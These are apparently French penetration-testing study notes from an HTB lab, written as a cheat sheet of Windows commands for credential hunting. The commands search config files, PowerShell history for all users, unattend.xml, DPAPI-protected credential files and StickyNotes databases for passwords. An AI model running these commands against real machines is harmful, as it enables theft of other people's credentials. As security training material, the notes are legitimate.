##Vol de creds

#Chasse aux identifiants !
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml 
	--> Fichiers de config
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
	--> chasse dans le dictionnaire chrome

unattend.xml --> peut avoir les credentials d'inscrits suite à une installation

./PSReadLine/ConsoleHost_history.txt --> historique powershell
gc (Get-PSReadLineOption).HistorySavePath --> Pareil
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
--> Pareil, mais pour tous les users

Credentials dans les scripts powershell--> généralements cryptés par DPAPI
	Si nous avons une RCE ou possibilité d'abuser de DPAPI
	Exemple: $credential = Import-Clixml -Path 'C:\chemin\script\pass.xml'
		 $credential.GetNetworkCredential().username
		 $credential.GetNetworkCredential().password


#Autres fichiers
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

StickyNotes DB Files --> rechercher dans ce chemin 
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_<SNIP>\LocalState\plum.sqlite 
Extraction avec PSSQLITE
--> Import-Module .\PSSQLite.psd1
    $db = 'C:\Chemin\vers\plum.sqlite'
    Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

Extraction avec strings
	Récuperer les fichiers "plum.sqlite" sur notre machine et executer "strings"